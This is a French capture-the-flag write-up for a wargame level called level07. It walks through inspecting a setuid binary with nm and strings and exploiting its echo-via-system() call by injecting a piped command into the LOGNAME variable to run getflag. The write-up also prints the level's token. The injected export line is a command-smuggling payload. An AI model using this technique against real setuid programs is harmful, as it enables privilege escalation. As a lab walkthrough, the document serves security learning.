## Démarche

- Dans le home, se situe un binaire :
    `ls -la`
    > -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
    `./level07`
    > level07

- Comprendre le fonctionnement du binaire avec `nm` et `strings` :
  
  -  `nm -u level07`

        ```
                U asprintf@@GLIBC_2.0
                U getegid@@GLIBC_2.0
                U getenv@@GLIBC_2.0
                U geteuid@@GLIBC_2.0
                U setresgid@@GLIBC_2.0
                U setresuid@@GLIBC_2.0
                U system@@GLIBC_2.0
        ```

        *comme dans le binaire du level03, `setresgid` et `setresgid` permettent au programme d'exécuter des commandes en tant qu'un utilisateur donné.
        De plus, un asprintf est appelé*

   - `strings level07`
        > LOGNAME

        > /bin/echo %s

- Chercher si `LOGNAME` est une variable d'environnement :
    `env`
    > LOGNAME=level07

  *le contenu de la variable correspond à la sortie d'affichage du programme*

- Changer la variable shell `LOGNAME` pour que notre binaire exécute le programme `getflag` :
    
    `export LOGNAME=""getflag" | bash -" ; echo $LOGNAME`
    > getflag | bash -

    `./level07`
    > Check flag.Here is your token : fiumuikeil55xe9cu4dood66h



## Ressources
- https://stackoverflow.com/questions/17674137/can-i-use-echo-to-execute-commands